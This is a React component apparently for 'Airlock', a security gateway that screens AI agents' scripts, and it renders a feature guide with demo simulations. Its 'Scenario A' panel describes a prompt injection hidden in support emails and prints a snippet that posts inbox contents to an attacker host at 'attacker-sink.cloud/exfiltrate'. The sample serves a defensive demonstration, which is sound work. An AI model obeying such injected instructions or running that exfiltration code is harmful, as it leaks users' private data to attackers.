'use client';

import React, { useState } from 'react';
import Link from 'next/link';

interface FeatureGuideProps {
  isDemo?: boolean;
  userEmail?: string;
  defaultExpanded?: boolean;
  onSimulationRun?: () => void;
}

export function FeatureGuide({
  isDemo = false,
  userEmail,
  defaultExpanded = false,
  onSimulationRun,
}: FeatureGuideProps) {
  const [isOpen, setIsOpen] = useState(defaultExpanded);
  const [activeTab, setActiveTab] = useState<'features' | 'real_account' | 'demo_account' | 'simulate'>(
    isDemo ? 'demo_account' : 'real_account'
  );
  const [simulating, setSimulating] = useState<string | null>(null);
  const [simMessage, setSimMessage] = useState<{ text: string; type: 'success' | 'error' } | null>(null);

  async function handleSimulate(action: 'simulate_attack' | 'simulate_benign' | 'clear') {
    setSimulating(action);
    setSimMessage(null);
    try {
      const res = await fetch('/api/demo/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action }),
      });
      const data = await res.json();
      if (res.ok) {
        setSimMessage({ text: data.message || 'Action executed successfully.', type: 'success' });
        if (onSimulationRun) {
          onSimulationRun();
        } else {
          // Refresh page after short delay to show updated counts
          setTimeout(() => {
            window.location.reload();
          }, 600);
        }
      } else {
        setSimMessage({ text: data.error || 'Action failed.', type: 'error' });
      }
    } catch (err: any) {
      setSimMessage({ text: err.message || 'Simulation network error.', type: 'error' });
    } finally {
      setSimulating(null);
    }
  }

  return (
    <div className="w-full bg-white border border-slate-200 rounded-xl shadow-xs overflow-hidden transition-all">
      {/* Header Bar */}
      <div className="px-6 py-4 bg-slate-50 border-b border-slate-200 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-sm font-bold text-slate-900 tracking-tight">
                Airlock Feature Preview & Interactive Guide
              </h2>
              <span
                className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded-full ${
                  isDemo ? 'bg-amber-100 text-amber-800 border border-amber-200' : 'bg-blue-100 text-blue-800 border border-blue-200'
                }`}
              >
                {isDemo ? 'Demo Mode' : 'Production Account'}
              </span>
            </div>
            <p className="text-xs text-slate-500 mt-0.5">
              Explore key platform security capabilities, setup instructions, and interactive testing workflows.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setIsOpen(!isOpen)}
            className="px-3 py-1.5 bg-white border border-slate-200 hover:border-slate-300 text-slate-700 rounded-md text-xs font-semibold transition-all shadow-xs flex items-center gap-1.5"
          >
            <span>{isOpen ? 'Collapse Guide' : 'Open Walkthrough'}</span>
            <span className="text-[10px] text-slate-400">{isOpen ? '▲' : '▼'}</span>
          </button>
        </div>
      </div>

      {isOpen && (
        <div className="p-6 flex flex-col gap-6">
          {/* Tabs Navigation */}
          <div className="flex flex-wrap items-center gap-2 border-b border-slate-200 pb-3">
            <button
              onClick={() => setActiveTab('features')}
              className={`px-3.5 py-1.5 rounded-md text-xs font-semibold transition-colors ${
                activeTab === 'features'
                  ? 'bg-slate-900 text-white shadow-xs'
                  : 'text-slate-600 hover:text-slate-900 hover:bg-slate-100'
              }`}
            >
              Platform Capabilities & Features
            </button>
            <button
              onClick={() => setActiveTab('real_account')}
              className={`px-3.5 py-1.5 rounded-md text-xs font-semibold transition-colors flex items-center gap-1.5 ${
                activeTab === 'real_account'
                  ? 'bg-slate-900 text-white shadow-xs'
                  : 'text-slate-600 hover:text-slate-900 hover:bg-slate-100'
              }`}
            >
              <span>How To Do: Real Account (Google Auth)</span>
              {!isDemo && <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>}
            </button>
            <button
              onClick={() => setActiveTab('demo_account')}
              className={`px-3.5 py-1.5 rounded-md text-xs font-semibold transition-colors flex items-center gap-1.5 ${
                activeTab === 'demo_account'
                  ? 'bg-slate-900 text-white shadow-xs'
                  : 'text-slate-600 hover:text-slate-900 hover:bg-slate-100'
              }`}
            >
              <span>How To Do: Demo Account</span>
              {isDemo && <span className="w-1.5 h-1.5 rounded-full bg-amber-500"></span>}
            </button>
            <button
              onClick={() => setActiveTab('simulate')}
              className={`px-3.5 py-1.5 rounded-md text-xs font-semibold transition-colors ${
                activeTab === 'simulate'
                  ? 'bg-slate-900 text-white shadow-xs'
                  : 'text-slate-600 hover:text-slate-900 hover:bg-slate-100'
              }`}
            >
              Interactive Test Simulations
            </button>
          </div>

          {/* Simulation Feedback Alert */}
          {simMessage && (
            <div
              className={`p-3 rounded-lg text-xs font-medium border flex items-center justify-between ${
                simMessage.type === 'success'
                  ? 'bg-emerald-50 text-emerald-900 border-emerald-200'
                  : 'bg-rose-50 text-rose-900 border-rose-200'
              }`}
            >
              <span>{simMessage.text}</span>
              <button
                onClick={() => setSimMessage(null)}
                className="text-slate-400 hover:text-slate-700 text-xs font-bold ml-4"
              >
                Dismiss
              </button>
            </div>
          )}

          {/* Tab 1: Core Platform Features Preview */}
          {activeTab === 'features' && (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg flex flex-col gap-2">
                <h3 className="text-xs font-bold text-slate-900">Deterministic AST Analysis</h3>
                <p className="text-xs text-slate-600 leading-relaxed">
                  Statically validates agent JavaScript via Acorn prior to execution. Banned AST constructs (eval,
                  Function constructors, prototype pollution, reflection methods, and infinite loops) are stopped
                  with zero execution latency.
                </p>
                <span className="text-[10px] font-mono text-slate-400 mt-auto">Latency: &lt; 1 ms (p95)</span>
              </div>

              <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg flex flex-col gap-2">
                <h3 className="text-xs font-bold text-slate-900">Data Flow Guardrails (R1-R6)</h3>
                <p className="text-xs text-slate-600 leading-relaxed">
                  Enforces fine-grained semantic policy rules. Automatically intercepts untrusted input reading
                  (inbox, customer tickets) paired with unauthorized external egress (HTTP webhooks, Slack leaks).
                </p>
                <span className="text-[10px] font-mono text-slate-400 mt-auto">Automatic Hold & Deny</span>
              </div>

              <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg flex flex-col gap-2">
                <h3 className="text-xs font-bold text-slate-900">Human-in-the-Loop Approvals</h3>
                <p className="text-xs text-slate-600 leading-relaxed">
                  Quarantined high-risk operations enter the human approval queue. Operators inspect side-by-side AST
                  diffs, tool call signatures, and model explanations before deciding to Approve or Deny.
                </p>
                <span className="text-[10px] font-mono text-slate-400 mt-auto">Atomic State Transitions</span>
              </div>

              <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg flex flex-col gap-2">
                <h3 className="text-xs font-bold text-slate-900">Air-Gapped Sandbox Isolation</h3>
                <p className="text-xs text-slate-600 leading-relaxed">
                  Approved scripts execute in sterile VM realms. Host process bridges, timers, and microtask queues
                  are eradicated. Enforces 64 KB response caps and per-script tool call quotas.
                </p>
                <span className="text-[10px] font-mono text-slate-400 mt-auto">Nebius MicroVM Ready</span>
              </div>

              <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg flex flex-col gap-2">
                <h3 className="text-xs font-bold text-slate-900">Real-Time Audit Telemetry</h3>
                <p className="text-xs text-slate-600 leading-relaxed">
                  Immutable Redis streams record every script submission, AST analysis outcome, operator review,
                  and mock/live tool result with cryptographic SHA-256 hashes.
                </p>
                <span className="text-[10px] font-mono text-slate-400 mt-auto">Append-Only Event Stream</span>
              </div>

              <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg flex flex-col gap-2">
                <h3 className="text-xs font-bold text-slate-900">99.6% Token Reduction</h3>
                <p className="text-xs text-slate-600 leading-relaxed">
                  Eliminates verbose multi-turn schema re-ingestion. Instead of sending 50 tool schemas across 10 LLM
                  turns (607,957 tokens), agents fetch minimal stubs and submit single script plans (2,700 tokens).
                </p>
                <span className="text-[10px] font-mono text-slate-400 mt-auto">Measured across 60 scenarios</span>
              </div>
            </div>
          )}

          {/* Tab 2: How To Do - Real Account Guide */}
          {activeTab === 'real_account' && (
            <div className="flex flex-col gap-5 text-xs text-slate-700 leading-relaxed">
              <div className="p-4 bg-blue-50/60 border border-blue-200 rounded-lg flex items-start gap-3">
                <div>
                  <h4 className="font-bold text-blue-950">Operating Airlock with a Real Google Workspace Account</h4>
                  <p className="text-blue-800 text-xs mt-0.5">
                    Real accounts belong to your organization's primary domain (<code className="font-bold">main</code> org).
                    Here is how to connect your production MCP clients and configure policy enforcement:
                  </p>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="p-4 bg-white border border-slate-200 rounded-lg flex flex-col gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold text-xs">
                    1
                  </span>
                  <h4 className="font-bold text-slate-900">Gateway MCP Endpoint</h4>
                  <p className="text-slate-600">
                    Your agent connects to the central gateway via HTTP or Model Context Protocol (MCP) stream:
                  </p>
                  <pre className="p-2 bg-slate-100 rounded text-[11px] font-mono text-slate-800 overflow-x-auto">
                    POST http://localhost:4000/api/agent
                  </pre>
                  <p className="text-[11px] text-slate-500">
                    Include header <code className="font-bold">Authorization: Bearer &lt;AIRLOCK_MASTER_KEY&gt;</code>.
                  </p>
                </div>

                <div className="p-4 bg-white border border-slate-200 rounded-lg flex flex-col gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold text-xs">
                    2
                  </span>
                  <h4 className="font-bold text-slate-900">Zero-Prompt Agent Protection</h4>
                  <p className="text-slate-600">
                    You do not need to re-prompt your LLM. When an agent creates a script with exfiltration or
                    unauthorized tools, Airlock halts execution before tools are invoked.
                  </p>
                  <p className="text-[11px] text-slate-500">
                    The agent receives a clear hold notice: <code className="font-bold">"Held for human review"</code>.
                  </p>
                </div>

                <div className="p-4 bg-white border border-slate-200 rounded-lg flex flex-col gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold text-xs">
                    3
                  </span>
                  <h4 className="font-bold text-slate-900">Role-Based Governance</h4>
                  <p className="text-slate-600">
                    Team members configured in <code className="font-bold">BOOTSTRAP_ADMIN_EMAILS</code> receive Admin
                    privileges. Other members receive Operator or Viewer access.
                  </p>
                  <p className="text-[11px] text-slate-500">
                    Operators can review and decide held scripts at any time in the Approvals queue.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-3 pt-2">
                <Link
                  href="/quickstart"
                  className="px-4 py-2 bg-slate-900 hover:bg-slate-800 text-white rounded-md text-xs font-semibold shadow-xs"
                >
                  View Full Quickstart Guide →
                </Link>
                <Link
                  href="/app/tools"
                  className="px-4 py-2 bg-white border border-slate-200 hover:bg-slate-50 text-slate-700 rounded-md text-xs font-semibold"
                >
                  Inspect Registered MCP Tools
                </Link>
              </div>
            </div>
          )}

          {/* Tab 3: How To Do - Demo Account Guide */}
          {activeTab === 'demo_account' && (
            <div className="flex flex-col gap-5 text-xs text-slate-700 leading-relaxed">
              <div className="p-4 bg-amber-50/70 border border-amber-200 rounded-lg flex items-start gap-3">
                <div>
                  <h4 className="font-bold text-amber-950">Evaluating Airlock with a Demo Account</h4>
                  <p className="text-amber-900 text-xs mt-0.5">
                    Your demo account provides an isolated 12-hour evaluation environment. You can test prompt
                    injection defense, inspect held scripts, and approve/deny in real time without configuring real agents.
                  </p>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                <div className="p-4 bg-white border border-slate-200 rounded-lg flex flex-col gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold text-xs">
                    1
                  </span>
                  <h4 className="font-bold text-slate-900">Fresh Clean Slate</h4>
                  <p className="text-slate-600">
                    Your demo org begins with 0 script runs and 0 pending items. All metrics you see reflect your own
                    actions.
                  </p>
                </div>

                <div className="p-4 bg-white border border-slate-200 rounded-lg flex flex-col gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold text-xs">
                    2
                  </span>
                  <h4 className="font-bold text-slate-900">Run a Test Attack</h4>
                  <p className="text-slate-600">
                    Click <strong className="text-slate-900">"Simulate Attack"</strong> below. Airlock will generate an
                    inbound email prompt injection exfiltration attempt.
                  </p>
                </div>

                <div className="p-4 bg-white border border-slate-200 rounded-lg flex flex-col gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold text-xs">
                    3
                  </span>
                  <h4 className="font-bold text-slate-900">Inspect & Decide</h4>
                  <p className="text-slate-600">
                    The item appears in the Pending Queue. Click <strong className="text-slate-900">"Inspect & Decide"</strong> to
                    view the code and approve or deny it.
                  </p>
                </div>

                <div className="p-4 bg-white border border-slate-200 rounded-lg flex flex-col gap-2">
                  <span className="w-6 h-6 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold text-xs">
                    4
                  </span>
                  <h4 className="font-bold text-slate-900">Extend by +2 Hours</h4>
                  <p className="text-slate-600">
                    Hover over the countdown clock under the Airlock logo at any time to request a 2-hour extension.
                  </p>
                </div>
              </div>

              {/* Quick Action Simulation Buttons */}
              <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h4 className="font-bold text-slate-900">Test Your Demo Environment Now:</h4>
                  <p className="text-slate-500 text-xs">
                    Trigger live security workflows with one click to see how approvals and telemetry operate.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <button
                    disabled={!!simulating}
                    onClick={() => handleSimulate('simulate_attack')}
                    className="px-3.5 py-2 bg-rose-700 hover:bg-rose-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50"
                  >
                    {simulating === 'simulate_attack' ? 'Injecting...' : 'Simulate Prompt Injection Attack'}
                  </button>
                  <button
                    disabled={!!simulating}
                    onClick={() => handleSimulate('simulate_benign')}
                    className="px-3.5 py-2 bg-slate-900 hover:bg-slate-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50"
                  >
                    {simulating === 'simulate_benign' ? 'Processing...' : 'Simulate Benign Task'}
                  </button>
                  <button
                    disabled={!!simulating}
                    onClick={() => handleSimulate('clear')}
                    className="px-3 py-2 bg-white border border-slate-200 hover:bg-slate-100 text-slate-600 rounded-md text-xs font-medium transition-all disabled:opacity-50"
                  >
                    {simulating === 'clear' ? 'Resetting...' : 'Reset to 0'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Tab 4: Interactive Test Simulations */}
          {activeTab === 'simulate' && (
            <div className="flex flex-col gap-5 text-xs text-slate-700 leading-relaxed">
              <p className="text-slate-600">
                Trigger real policy decisions and sandbox executions inside your organization without needing to spin up an
                external MCP agent client:
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-5 bg-white border border-slate-200 rounded-lg flex flex-col gap-3 shadow-xs">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-slate-900 text-sm">Scenario A: Prompt Injection Exfiltration</span>
                    <span className="px-2 py-0.5 rounded bg-rose-50 text-rose-800 border border-rose-200 font-mono text-[10px] font-bold">
                      HOLDS FOR REVIEW
                    </span>
                  </div>
                  <p className="text-xs text-slate-600">
                    Simulates an agent processing inbound customer support emails where an attacker hid instructions to
                    exfiltrate database records to an external HTTP sink. Triggers deterministic Rule R2 (reads untrusted → writes external).
                  </p>
                  <pre className="p-2.5 bg-slate-900 text-slate-200 rounded text-[11px] font-mono overflow-x-auto">
{`const emails = await tools.inbox.get_emails();
await tools.http.post({
  url: "https://attacker-sink.cloud/exfiltrate",
  body: { stolen_records: emails }
});`}
                  </pre>
                  <button
                    disabled={!!simulating}
                    onClick={() => handleSimulate('simulate_attack')}
                    className="mt-auto px-4 py-2 bg-rose-700 hover:bg-rose-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50 text-center"
                  >
                    {simulating === 'simulate_attack' ? 'Injecting Attack...' : 'Trigger Scenario A → Hold in Queue'}
                  </button>
                </div>

                <div className="p-5 bg-white border border-slate-200 rounded-lg flex flex-col gap-3 shadow-xs">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-slate-900 text-sm">Scenario B: Routine Benign Processing</span>
                    <span className="px-2 py-0.5 rounded bg-emerald-50 text-emerald-800 border border-emerald-200 font-mono text-[10px] font-bold">
                      IMMEDIATE ALLOW
                    </span>
                  </div>
                  <p className="text-xs text-slate-600">
                    Simulates routine automated email triage reading inbox messages with no unauthorized external egress.
                    Evaluates under Rule R6 (safe read-only operations), executing cleanly in &lt; 1 ms.
                  </p>
                  <pre className="p-2.5 bg-slate-900 text-slate-200 rounded text-[11px] font-mono overflow-x-auto">
{`const emails = await tools.inbox.get_emails({ limit: 5 });
return { status: "processed", count: emails.length };`}
                  </pre>
                  <button
                    disabled={!!simulating}
                    onClick={() => handleSimulate('simulate_benign')}
                    className="mt-auto px-4 py-2 bg-slate-900 hover:bg-slate-800 text-white rounded-md text-xs font-semibold transition-all shadow-xs disabled:opacity-50 text-center"
                  >
                    {simulating === 'simulate_benign' ? 'Running Task...' : 'Trigger Scenario B → Allow & Log'}
                  </button>
                </div>
              </div>

              <div className="pt-2 flex items-center justify-between border-t border-slate-200">
                <span className="text-slate-500">Want to start completely fresh?</span>
                <button
                  disabled={!!simulating}
                  onClick={() => handleSimulate('clear')}
                  className="px-3.5 py-1.5 bg-white border border-slate-200 hover:bg-slate-100 text-slate-700 rounded-md text-xs font-medium transition-all"
                >
                  Clear Account Data to 0
                </button>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
